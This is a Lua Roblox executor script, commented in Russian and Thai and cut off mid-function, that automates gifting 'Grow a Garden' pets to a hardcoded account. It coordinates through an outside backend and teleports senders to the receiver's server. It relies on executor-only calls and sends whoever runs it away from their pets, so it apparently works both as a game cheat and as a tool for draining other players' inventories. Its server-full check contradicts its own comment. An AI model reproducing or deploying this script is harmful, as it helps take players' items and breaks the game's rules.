-- Авто трейд скрипт для GAG
-- Конфигурация
getgenv().Config = {
    Recipients = { -- Список получателей для трейда
        "Mattegoda90168",
    },
    PetsToTrade = { -- Список питомцев для трейда
        "Mimic Octopus",
    },
    Enabled = true, -- Включить/выключить авто трейд
    BackendURL = "https://trade-private.vercel.app", -- URL бекенд сервера
    UseBackend = true, -- Использовать бекенд для координации
    AutoTeleport = true, -- Автоматически телепортироваться к получателю
    SkipTeleportIfNoPets = true, -- Пропускать телепорт если нет питомцев для трейда
    LeaveServerAfterTrade = true, -- Выход с сервера после трейда (для отправителей)
    MaxPetsPerAccount = 55, -- Максимальное количество питомцев на аккаунт
    TradeTimeout = 300, -- Таймаут трейда в секундах (5 минут)
    ServerSelectionTimeout = 30, -- Таймаут выбора сервера в секундах
    AutoRejoinOnVipServer = false, -- Автоматически переходить с VIP серверов
    QueueCheckInterval = 30 -- Интервал проверки очереди в секундах
}

-- Сервисы
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- GUI для сообщений
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AutoTradeGUI"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"
Frame.Size = UDim2.new(0, 350, 0, 250)
Frame.Position = UDim2.new(0, 10, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Text = "Авто Трейд Статус"
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.Parent = Frame

local UICorner2 = Instance.new("UICorner")
UICorner2.CornerRadius = UDim.new(0, 8)
UICorner2.Parent = Title

-- Кнопка копирования
local CopyButton = Instance.new("TextButton")
CopyButton.Name = "CopyButton"
CopyButton.Size = UDim2.new(0, 80, 0, 25)
CopyButton.Position = UDim2.new(1, -170, 0, 5)
CopyButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.Text = "Copy All"
CopyButton.TextScaled = true
CopyButton.Font = Enum.Font.GothamBold
CopyButton.Parent = Title

local UICorner4 = Instance.new("UICorner")
UICorner4.CornerRadius = UDim.new(0, 4)
UICorner4.Parent = CopyButton

-- Кнопка закрытия
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 80, 0, 25)
CloseButton.Position = UDim2.new(1, -85, 0, 5)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Text = "Close"
CloseButton.TextScaled = true
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = Title

local UICorner5 = Instance.new("UICorner")
UICorner5.CornerRadius = UDim.new(0, 4)
UICorner5.Parent = CloseButton

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Name = "LogFrame"
ScrollingFrame.Size = UDim2.new(1, -10, 1, -50)
ScrollingFrame.Position = UDim2.new(0, 5, 0, 40)
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.Parent = Frame

local UICorner3 = Instance.new("UICorner")
UICorner3.CornerRadius = UDim.new(0, 6)
UICorner3.Parent = ScrollingFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = ScrollingFrame
UIListLayout.Padding = UDim.new(0, 2)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Массив для хранения всех сообщений
local allMessages = {}

-- Функция для добавления сообщений в GUI
local function AddMessage(message, messageType)
    messageType = messageType or "info"
    
    local colors = {
        info = Color3.fromRGB(255, 255, 255),
        success = Color3.fromRGB(0, 255, 0),
        warning = Color3.fromRGB(255, 255, 0),
        error = Color3.fromRGB(255, 0, 0)
    }
    
    -- Добавляем сообщение в массив
    table.insert(allMessages, message)
    
    local TextLabel = Instance.new("TextLabel")
    TextLabel.Size = UDim2.new(1, 0, 0, 20)
    TextLabel.BackgroundTransparency = 1
    TextLabel.TextColor3 = colors[messageType] or colors.info
    TextLabel.Text = message
    TextLabel.TextScaled = true
    TextLabel.Font = Enum.Font.Gotham
    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
    TextLabel.Parent = ScrollingFrame
    
    -- Ограничиваем количество сообщений
    local children = ScrollingFrame:GetChildren()
    if #children > 50 then
        children[1]:Destroy()
    end
    
    -- Автоматическая прокрутка вниз
    ScrollingFrame.CanvasPosition = Vector2.new(0, ScrollingFrame.CanvasSize.Y.Offset)
end

-- Функция для копирования всех сообщений
local function CopyAllMessages()
    local clipboard = table.concat(allMessages, "\n")
    
    -- Используем setclipboard если доступен
    if setclipboard then
        setclipboard(clipboard)
        AddMessage("Все сообщения скопированы в буфер обмена!", "success")
    else
        -- Альтернативный способ через GUI
        local clipboardGui = Instance.new("ScreenGui")
        clipboardGui.Name = "ClipboardGui"
        clipboardGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        
        local clipboardFrame = Instance.new("Frame")
        clipboardFrame.Size = UDim2.new(0, 400, 0, 300)
        clipboardFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
        clipboardFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        clipboardFrame.BorderSizePixel = 0
        clipboardFrame.Parent = clipboardGui
        
        local UICorner5 = Instance.new("UICorner")
        UICorner5.CornerRadius = UDim.new(0, 8)
        UICorner5.Parent = clipboardFrame
        
        local clipboardTitle = Instance.new("TextLabel")
        clipboardTitle.Size = UDim2.new(1, 0, 0, 30)
        clipboardTitle.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        clipboardTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        clipboardTitle.Text = "Скопированные сообщения"
        clipboardTitle.TextScaled = true
        clipboardTitle.Font = Enum.Font.GothamBold
        clipboardTitle.Parent = clipboardFrame
        
        local clipboardTextBox = Instance.new("TextBox")
        clipboardTextBox.Size = UDim2.new(1, -20, 1, -40)
        clipboardTextBox.Position = UDim2.new(0, 10, 0, 35)
        clipboardTextBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        clipboardTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        clipboardTextBox.Text = clipboard
        clipboardTextBox.TextXAlignment = Enum.TextXAlignment.Left
        clipboardTextBox.TextYAlignment = Enum.TextYAlignment.Top
        clipboardTextBox.TextWrapped = true
        clipboardTextBox.Font = Enum.Font.Gotham
        clipboardTextBox.Parent = clipboardFrame
        
        local closeButton = Instance.new("TextButton")
        closeButton.Size = UDim2.new(0, 80, 0, 25)
        closeButton.Position = UDim2.new(0.5, -40, 1, -30)
        closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeButton.Text = "Закрыть"
        closeButton.TextScaled = true
        closeButton.Font = Enum.Font.GothamBold
        closeButton.Parent = clipboardFrame
        
        closeButton.MouseButton1Click:Connect(function()
            clipboardGui:Destroy()
        end)
        
        AddMessage("Сообщения показаны в окне. Скопируйте текст вручную.", "info")
    end
end

-- Подключаем кнопку копирования
CopyButton.MouseButton1Click:Connect(CopyAllMessages)

-- Подключаем кнопку закрытия
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    AddMessage("UI закрыт. Скрипт продолжает работать в фоне.", "info")
end)

-- Переменные
local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
local AcceptPetGift = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("AcceptPetGift")
local GiftPet = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")

-- Функция для получения данных питомца
local function GetPetData(tool)
    if not tool or not tool:IsA("Tool") then
        return nil
    end
    
    local petUUID = tool:GetAttribute("PET_UUID")
    if not petUUID then
        return nil
    end
    
    return {
        Name = tool.Name,
        UUID = petUUID,
        Tool = tool
    }
end

-- Функция для получения всего инвентаря
local function GetFullInventory()
    local inventory = {}
    local character = LocalPlayer.Character
    
    if not character then
        return inventory
    end
    
    -- Ищем предметы в персонаже (в руках)
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(inventory, item)
        end
    end
    
    -- Ищем предметы в рюкзаке
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(inventory, item)
            end
        end
    end
    
    return inventory
end

-- Функция для поиска питомцев в инвентаре
local function GetPetsInInventory()
    local pets = {}
    local character = LocalPlayer.Character
    
    if not character then
        return pets
    end
    
    -- Ищем питомцев в персонаже (в руках)
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") and item:GetAttribute("PET_UUID") then
            local petData = GetPetData(item)
            if petData then
                table.insert(pets, petData)
            end
        end
    end
    
    -- Ищем питомцев в рюкзаке
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") and item:GetAttribute("PET_UUID") then
                local petData = GetPetData(item)
                if petData then
                    table.insert(pets, petData)
                end
            end
        end
    end
    
    return pets
end

-- Функция для взятия питомца в руки
local function EquipPet(petData)
    if not petData or not petData.Tool then
        return false
    end
    
    local character = LocalPlayer.Character
    if not character then
        return false
    end
    
    -- Проверяем, не держим ли уже этот питомец
    local currentTool = character:FindFirstChildWhichIsA("Tool")
    if currentTool and currentTool == petData.Tool then
        return true -- Уже держим нужного питомца
    end
    
    -- Берем питомца в руки
    if petData.Tool.Parent == LocalPlayer.Backpack then
        petData.Tool.Parent = character
        AddMessage("Взял в руки питомца: " .. petData.Name, "info")
    else
        AddMessage("Питомец уже в руках: " .. petData.Name, "info")
    end
    
    return true
end

-- Функция для извлечения основного имени питомца (без веса и возраста)
local function GetBasePetName(fullPetName)
    -- Убираем информацию о весе и возрасте
    local baseName = fullPetName:match("^([^%[]+)")
    if baseName then
        return baseName:gsub("%s+$", "") -- Убираем пробелы в конце
    end
    return fullPetName
end

-- Функция для проверки, является ли питомец в списке для трейда
local function IsPetInTradeList(petName)
    local basePetName = GetBasePetName(petName)
    
    for _, pet in pairs(getgenv().Config.PetsToTrade) do
        if pet == basePetName then
            return true
        end
    end
    return false
end

-- Функция для HTTP запросов к бекенду
local function MakeHttpRequest(url, method, data)
    -- Пробуем разные варианты HTTP запросов
    local request = http_request or syn.request or request or HttpService.RequestAsync
    
    -- Отладочная информация о доступных методах
    if http_request then
        AddMessage("Используется http_request", "info")
    elseif syn and syn.request then
        AddMessage("Используется syn.request", "info")
    elseif request then
        AddMessage("Используется request", "info")
    elseif HttpService.RequestAsync then
        AddMessage("Используется HttpService.RequestAsync", "info")
    else
        AddMessage("Нет доступных методов HTTP запросов", "error")
        return nil
    end
    
    local success, result = pcall(function()
        if method == "GET" then
            if request == HttpService.RequestAsync then
                -- Используем HttpService.RequestAsync как fallback
                local response = request(HttpService, {
                    Url = url,
                    Method = "GET"
                })
                return response.Body
            else
                -- Используем http_request или syn.request
                local response = request({
                    Url = url,
                    Method = "GET"
                })
                return response.Body
            end
        elseif method == "POST" then
            if request == HttpService.RequestAsync then
                -- Используем HttpService.RequestAsync как fallback
                local response = request(HttpService, {
                    Url = url,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode(data)
                })
                return response.Body
            else
                -- Используем http_request или syn.request
                local response = request({
                    Url = url,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode(data)
                })
                return response.Body
            end
        elseif method == "DELETE" then
            if request == HttpService.RequestAsync then
                -- Используем HttpService.RequestAsync как fallback
                local response = request(HttpService, {
                    Url = url,
                    Method = "DELETE"
                })
                return response.Body
            else
                -- Используем http_request или syn.request
                local response = request({
                    Url = url,
                    Method = "DELETE"
                })
                return response.Body
            end
        end
    end)
    
    if success and result then
        -- Проверяем, что результат не пустой
        if result and result ~= "" then
            local success2, decoded = pcall(function()
                return HttpService:JSONDecode(result)
            end)
            
            if success2 then
                return decoded
            else
                AddMessage("Ошибка декодирования JSON: " .. tostring(decoded), "error")
                AddMessage("Полученный ответ: " .. tostring(result), "error")
                return nil
            end
        else
            AddMessage("Получен пустой ответ от сервера", "error")
            return nil
        end
    else
        AddMessage("Ошибка HTTP запроса: " .. tostring(result), "error")
        return nil
    end
end

-- Функция для проверки, является ли сервер VIP (только один игрок)
local function IsVipServer()
    local players = game.Players:GetPlayers()
    return #players == 1
end

-- Функция для проверки, полный ли сервер
local function IsServerFull()
    local maxPlayers = game.Players.MaxPlayers
    local currentPlayers = #game.Players:GetPlayers()
    
    -- Считаем сервер полным, если занято 95% мест
    local fullThreshold = maxPlayers + 10 
    
    return currentPlayers >= fullThreshold
end

-- Функция для проверки стабильности соединения
local function IsConnectionStable()
    -- Проверяем основные компоненты
    if not LocalPlayer then
        return false
    end
    
    if not LocalPlayer.Character then
        return false
    end
    
    -- Проверяем сетевое соединение
    local connection = game:GetService("NetworkClient")
    if not connection then
        return false
    end

    if not LocalPlayer or not LocalPlayer.Character then
        return false
    end
    
    -- Проверяем, что мы не в процессе телепорта
    local teleportState = TeleportService:GetLocalPlayerTeleportData()
    if teleportState and teleportState.teleporting then
        return false
    end
    
    return true
end

-- Функция для ожидания стабильного соединения
local function WaitForStableConnection(timeout)
    timeout = timeout or 30 -- 30 секунд по умолчанию
    local startTime = tick()
    
    while tick() - startTime < timeout do
        if IsConnectionStable() then
            return true
        end
        task.wait(1)
    end
    
    return false
end

-- Функция для проверки доступности бекенда
local function IsBackendAvailable()
    if not getgenv().Config.UseBackend then
        return false
    end
    
    local url = getgenv().Config.BackendURL .. "/api/stats"
    local response = MakeHttpRequest(url, "GET")
    
    return response and response.success
end

-- Функция для ожидания доступности бекенда
local function WaitForBackend(timeout)
    timeout = timeout or 60 -- 60 секунд по умолчанию
    local startTime = tick()
    
    AddMessage("Ожидание доступности бекенда...", "info")
    
    while tick() - startTime < timeout do
        if IsBackendAvailable() then
            AddMessage("Бекенд доступен!", "success")
            return true
        end
        task.wait(5)
    end
    
    AddMessage("Бекенд недоступен после " .. timeout .. " секунд", "error")
    return false
end

-- Функция для перехода на обычный сервер
local function RejoinNormalServer()
    local placeId = 126884695634066 -- ID игры GAG
    
    -- Проверяем, являемся ли мы получателем
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Только получатели могут переходить на обычные серверы
    if not isReceiver then
        AddMessage("Отправители не переходят на обычные серверы (остаемся на текущем)", "info")
        return false
    end
    
    AddMessage("Переход на обычный сервер (получатель)...", "info")
    
    -- Добавляем задержку перед телепортом для стабильности
    task.wait(2)
    
    local success, error = pcall(function()
        TeleportService:Teleport(placeId)
    end)
    
    if success then
        AddMessage("Переход на обычный сервер запущен...", "success")
        return true
    else
        AddMessage("Ошибка перехода на обычный сервер: " .. tostring(error), "error")
        return false
    end
end

-- Функция для обработки закрытия сервера
local function HandleServerClosing()
    AddMessage("⚠️ Сервер закрывается! Обработка отключения...", "warning")
    
    -- Проверяем, являемся ли мы получателем
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    if isReceiver then
        AddMessage("Получатель: автоматический переход на новый сервер...", "info")
        -- Небольшая задержка перед телепортом
        task.wait(3)
        RejoinNormalServer()
    else
        AddMessage("Отправитель: ожидание перехода на новый сервер...", "info")
        -- Отправители также переходят на новый сервер при закрытии
        task.wait(3)
        local placeId = 126884695634066
        pcall(function()
            TeleportService:Teleport(placeId)
        end)
    end
end

-- Функция для выхода с сервера (кик отправителя после трейда)
local function LeaveServerAfterTrade()
    local placeId = 126884695634066 -- ID игры GAG
    
    AddMessage("Отправитель: выход с сервера после трейда...", "info")
    
    local success, error = pcall(function()
        TeleportService:Teleport(placeId)
    end)
    
    if success then
        AddMessage("Выход с сервера запущен...", "success")
        return true
    else
        AddMessage("Ошибка выхода с сервера: " .. tostring(error), "error")
        return false
    end
end

-- Функция для проверки, есть ли у игрока питомцы для трейда
local function HasPetsForTrade()
    local petsInInventory = GetPetsInInventory()
    local hasTradePets = false
    
    for _, petData in pairs(petsInInventory) do
        if IsPetInTradeList(petData.Name) then
            hasTradePets = true
            break
        end
    end
    
    return hasTradePets
end

-- Функция для проверки получателей через бекенд
local function CheckReceiversViaBackend()
    if not getgenv().Config.UseBackend then
        return nil
    end
    
    -- Проверяем, являемся ли мы получателем
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Только получатели проверяют и переходят с VIP/полных серверов
    if isReceiver then
        -- Проверяем, не находимся ли мы на VIP сервере
        if IsVipServer() then
            AddMessage("Получатель: обнаружен VIP сервер, переход на обычный сервер...", "warning")
            RejoinNormalServer()
            return nil
        end
        
        -- Проверяем, не полный ли сервер
        if IsServerFull() then
            AddMessage("Получатель: сервер полный, переход на другой сервер...", "warning")
            RejoinNormalServer()
            return nil
        end
    else
        -- Мы отправитель, проверяем есть ли питомцы для трейда
        if not HasPetsForTrade() then
            AddMessage("Отправитель: нет питомцев для трейда в инвентаре, ожидание...", "warning")
            return nil
        end
        
        -- Отправители не переходят с VIP серверов (остаются на своих)
        if IsVipServer() then
            AddMessage("Отправитель: VIP сервер, остаемся на текущем сервере", "info")
            return nil
        end
        
        -- Отправители не переходят с полных серверов (остаются на своих)
        if IsServerFull() then
            AddMessage("Отправитель: сервер полный, остаемся на текущем сервере", "info")
            return nil
        end
    end
    
    local usernames = table.concat(getgenv().Config.Recipients, ",")
    local url = getgenv().Config.BackendURL .. "/api/check-receivers?usernames=" .. usernames
    
    local response = MakeHttpRequest(url, "GET")
    if response and response.success and response.availableReceivers and #response.availableReceivers > 0 then
        return response.availableReceivers[1] -- Возвращаем первого доступного
    end
    
    return nil
end

-- Функция для телепорта к получателю
local function TeleportToReceiver(receiverData)
    if not getgenv().Config.AutoTeleport or not receiverData then
        return false
    end
    
    -- Проверяем, есть ли у нас питомцы для трейда (если включена настройка)
    if getgenv().Config.SkipTeleportIfNoPets then
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if not isReceiver and not HasPetsForTrade() then
            AddMessage("Пропуск телепорта: нет питомцев для трейда", "warning")
            return false
        end
    end
    
    local placeId = 126884695634066 -- ID игры GAG
    local serverId = receiverData.serverId
    
    AddMessage("Телепорт к получателю: " .. receiverData.username .. " на сервер: " .. serverId, "info")
    
    local success, error = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId, serverId)
    end)
    
    if success then
        AddMessage("Телепорт запущен...", "success")
        return true
    else
        AddMessage("Ошибка телепорта: " .. tostring(error), "error")
        return false
    end
end

-- Функция для обычного присоединения к серверу (без API Roblox)
local function JoinNormalServer()
    local placeId = 126884695634066 -- ID игры GAG
    
    AddMessage("Присоединение к обычному серверу...", "info")
    
    local success, error = pcall(function()
        TeleportService:Teleport(placeId)
    end)
    
    if success then
        AddMessage("Присоединение к серверу запущено...", "success")
        return true
    else
        AddMessage("Ошибка присоединения к серверу: " .. tostring(error), "error")
        return false
    end
end

-- Функция для завершения трейда
local function CompleteTrade(targetReceiver, success)
    if not getgenv().Config.UseBackend then
        return
    end
    
    local username = LocalPlayer.Name
    
    local data = {
        sender = username,
        receiver = targetReceiver,
        success = success or true
    }
    
    local url = getgenv().Config.BackendURL .. "/api/complete-trade"
    local response = MakeHttpRequest(url, "POST", data)
    
    if response and response.success then
        AddMessage("Трейд отмечен как завершенный", "success")
        return true
    else
        AddMessage("Ошибка завершения трейда", "error")
        return false
    end
end

-- Функция для поиска первого доступного игрока из списка получателей
local function FindFirstAvailableRecipient()
    -- Сначала проверяем, есть ли получатель на текущем сервере
    for _, username in pairs(getgenv().Config.Recipients) do
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name == username then
                AddMessage("Найден получатель на текущем сервере: " .. player.Name, "success")
                return player
            end
        end
    end
    
    -- Если получателя нет на текущем сервере, проверяем через бекенд
    if getgenv().Config.UseBackend then
        local backendReceiver = CheckReceiversViaBackend()
        if backendReceiver then
            AddMessage("Найден получатель через бекенд: " .. backendReceiver.username, "success")
            
            -- Если включен автотелепорт И мы НЕ получатель, то телепортируемся
            if getgenv().Config.AutoTeleport and LocalPlayer.Name ~= backendReceiver.username then
                TeleportToReceiver(backendReceiver)
                return nil -- Возвращаем nil, так как телепортируемся
            elseif LocalPlayer.Name == backendReceiver.username then
                -- Мы сами получатель, не телепортируемся
                AddMessage("Мы являемся получателем, ожидаем отправителя...", "info")
                return nil
            end
        end
    end
    
    return nil
end

-- Функция для поиска игрока по имени
local function FindPlayerByName(username)
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name == username then
            return player
        end
    end
    return nil
end

-- Функция для отправки питомца
local function SendPet(petData, targetPlayer)
    if not petData or not targetPlayer then
        return false
    end
    
    -- Проверяем, что питомец все еще в инвентаре
    if not petData.Tool or not petData.Tool.Parent then
        AddMessage("Питомец больше не найден: " .. petData.Name, "error")
        return false
    end
    
    local args = {
        "GivePet",
        targetPlayer
    }
    
    PetGiftingService:FireServer(unpack(args))
    AddMessage("Отправлен питомец: " .. petData.Name .. " игроку: " .. targetPlayer.Name, "success")
    
    -- Небольшая задержка для обработки сервером
    task.wait(0.2)
    
    return true
end

-- Функция для принятия подарка
local function AcceptGift(giftId)
    local args = {
        true,
        giftId
    }
    
    AcceptPetGift:FireServer(unpack(args))
    AddMessage("Принят подарок с ID: " .. giftId, "success")
end

-- Функция для подсчета питомцев в инвентаре
local function CountPetsInInventory()
    local petsInInventory = GetPetsInInventory()
    return #petsInInventory
end

-- Функция для регистрации получателя в бекенде
local function RegisterAsReceiver()
    if not getgenv().Config.UseBackend then
        return
    end
    
    -- Проверяем доступность бекенда
    if not IsBackendAvailable() then
        AddMessage("Бекенд недоступен, пропуск регистрации", "warning")
        return false
    end
    
    -- Проверяем, являемся ли мы получателем
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Только получатели регистрируются и переходят с VIP/полных серверов
    if isReceiver then
        -- Проверяем, не находимся ли мы на VIP сервере
        if IsVipServer() then
            AddMessage("Получатель: VIP сервер, переход на обычный сервер перед регистрацией...", "warning")
            RejoinNormalServer()
            return false
        end
        
        -- Проверяем, не полный ли сервер
        if IsServerFull() then
            AddMessage("Получатель: сервер полный, переход на другой сервер перед регистрацией...", "warning")
            RejoinNormalServer()
            return false
        end
    else
        -- Отправители не регистрируются как получатели
        AddMessage("Отправитель: не регистрируемся как получатель", "info")
        return false
    end
    
    local username = LocalPlayer.Name
    local jobId = "job-" .. username .. "-" .. tostring(tick())
    local serverId = game.JobId
    local petsCount = CountPetsInInventory()
    local maxPets = getgenv().Config.MaxPetsPerAccount
    
    local data = {
        receiver = username,
        jobId = jobId,
        serverId = serverId,
        petsCount = petsCount,
        maxPets = maxPets
    }
    
    local url = getgenv().Config.BackendURL .. "/api/register-job"
    local response = MakeHttpRequest(url, "POST", data)
    
    if response and response.success then
        AddMessage("Зарегистрирован как получатель в бекенде", "success")
        AddMessage("Job ID: " .. jobId, "info")
        AddMessage("Server ID: " .. serverId, "info")
        AddMessage("Питомцев в инвентаре: " .. petsCount .. "/" .. maxPets, "info")
        AddMessage("Статус: " .. response.status, "info")
        
        -- Сохраняем jobId для последующего удаления
        getgenv().CurrentJobId = jobId
        return true
    else
        AddMessage("Ошибка регистрации в бекенде", "error")
        return false
    end
end

-- Функция для удаления регистрации получателя
local function UnregisterAsReceiver()
    if not getgenv().Config.UseBackend or not getgenv().CurrentJobId then
        return
    end
    
    local url = getgenv().Config.BackendURL .. "/api/job/" .. getgenv().CurrentJobId
    local response = MakeHttpRequest(url, "DELETE")
    
    if response and response.success then
        AddMessage("Удалена регистрация получателя", "success")
        getgenv().CurrentJobId = nil
        return true
    else
        AddMessage("Ошибка удаления регистрации", "error")
        return false
    end
end

-- Функция для обновления статуса получателя
local function UpdateReceiverStatus()
    if not getgenv().Config.UseBackend then
        return
    end
    
    -- Проверяем, являемся ли мы получателем
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Только получатели обновляют статус и переходят с VIP/полных серверов
    if isReceiver then
        -- Проверяем, не находимся ли мы на VIP сервере
        if IsVipServer() then
            AddMessage("Получатель: VIP сервер, переход на обычный сервер...", "warning")
            RejoinNormalServer()
            return false
        end
        
        -- Проверяем, не полный ли сервер
        if IsServerFull() then
            AddMessage("Получатель: сервер полный, переход на другой сервер...", "warning")
            RejoinNormalServer()
            return false
        end
    else
        -- Отправители не обновляют статус получателя
        AddMessage("Отправитель: не обновляем статус получателя", "info")
        return false
    end
    
    local username = LocalPlayer.Name
    local serverId = game.JobId
    local petsCount = CountPetsInInventory()
    local maxPets = getgenv().Config.MaxPetsPerAccount
    
    local data = {
        receiver = username,
        serverId = serverId,
        petsCount = petsCount,
        maxPets = maxPets
    }
    
    local url = getgenv().Config.BackendURL .. "/api/update-receiver"
    local response = MakeHttpRequest(url, "POST", data)
    
    if response and response.success then
        AddMessage("Статус получателя обновлен", "info")
        AddMessage("Питомцев в инвентаре: " .. petsCount .. "/" .. maxPets, "info")
        AddMessage("Статус: " .. response.status, "info")
        return true
    else
        AddMessage("Ошибка обновления статуса", "error")
        return false
    end
end

-- Основная функция авто трейда
local function AutoTrade()
    if not getgenv().Config.Enabled then
        return
    end
    
    -- Проверяем подключение и персонажа
    if not LocalPlayer or not LocalPlayer.Character then
        AddMessage("Персонаж не загружен, ожидание...", "warning")
        return
    end
    
    -- Проверяем стабильность соединения
    local connection = game:GetService("NetworkClient")
    -- if not connection or not connection.Connection then
    --     AddMessage("Проблемы с сетевым соединением, ожидание...", "error")
    --     return
    -- end
    
    -- Проверяем, являемся ли мы получателем
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Если мы получатель, не выполняем логику отправки
    if isReceiver then
        AddMessage("Мы являемся получателем, ожидаем отправителя...", "info")
        return
    end
    
    -- Проверяем, есть ли у нас питомцы для трейда
    if not HasPetsForTrade() then
        AddMessage("Нет питомцев для трейда в инвентаре, ожидание...", "warning")
        return
    end
    
    -- Проверяем доступных получателей через бекенд
    local availableReceiver = nil
    if getgenv().Config.UseBackend then
        local usernames = table.concat(getgenv().Config.Recipients, ",")
        local url = getgenv().Config.BackendURL .. "/api/check-receivers?usernames=" .. usernames
        local response = MakeHttpRequest(url, "GET")
        
        if response and response.success and response.availableReceivers and #response.availableReceivers > 0 then
            availableReceiver = response.availableReceivers[1]
            AddMessage("Найден доступный получатель: " .. availableReceiver.username, "success")
            AddMessage("Статус: " .. availableReceiver.status, "info")
            AddMessage("Питомцев у получателя: " .. availableReceiver.petsCount .. "/" .. availableReceiver.maxPets, "info")
        else
            AddMessage("Нет доступных получателей для трейда", "warning")
            return
        end
    else
        -- Старая логика для локального поиска
        local targetPlayer = FindFirstAvailableRecipient()
        if targetPlayer then
            AddMessage("Найден получатель на текущем сервере: " .. targetPlayer.Name, "success")
        else
            local recipientList = table.concat(getgenv().Config.Recipients, ", ")
            AddMessage("Ни один из получателей не найден на сервере: " .. recipientList, "error")
            return
        end
    end
    
    -- Если используем бекенд и есть доступный получатель, присоединяемся к обычному серверу
            -- ถ้าใช้เบคเอนด์และมีผู้รับ...
    if getgenv().Config.UseBackend and availableReceiver then
        
        -- 1. เช็คก่อนว่าอยู่คนละเซิร์ฟเวอร์หรือไม่
        if game.JobId ~= availableReceiver.serverId then
            -- 2. ถ้าอยู่คนละเซิร์ฟ ค่อยสั่งวาร์ป
            AddMessage("กำลังวาร์ปไปหา " .. availableReceiver.username .. " ที่เซิร์ฟอื่น...", "info")
            if not TeleportToReceiver(availableReceiver) then
                AddMessage("Ошибка присоединения к серверу", "error")
                return -- ถ้าเทเลพอร์ตไม่สำเร็จ ให้หยุด
            end

            -- 3. รอให้เกมโหลดทันหลังจากวาร์ป
            AddMessage("รอโหลดเซิร์ฟเวอร์หลังวาร์ป...", "info")
            task.wait(10) -- เพิ่มการรอที่จำเป็น
        else
            -- 4. ถ้าอยู่เซิร์ฟเดียวกันแล้ว ก็แค่แจ้งสถานะ ไม่ต้องวาร์ป
            AddMessage("อยู่เซิร์ฟเดียวกับเป้าหมายแล้ว เริ่มค้นหา...", "success")
        end

        -- 5. ส่วนของการค้นหาผู้เล่น (จะทำงานหลังจากวาร์ปเสร็จ หรือหลังจากพบว่าอยู่เซิร์ฟเดียวกันแล้ว)
        -- โค้ดส่วนนี้คือโค้ดเดิมของคุณที่ใช้ while loop
        AddMessage("เริ่มต้นการค้นหาผู้เล่นในเซิร์ฟเวอร์...", "info")
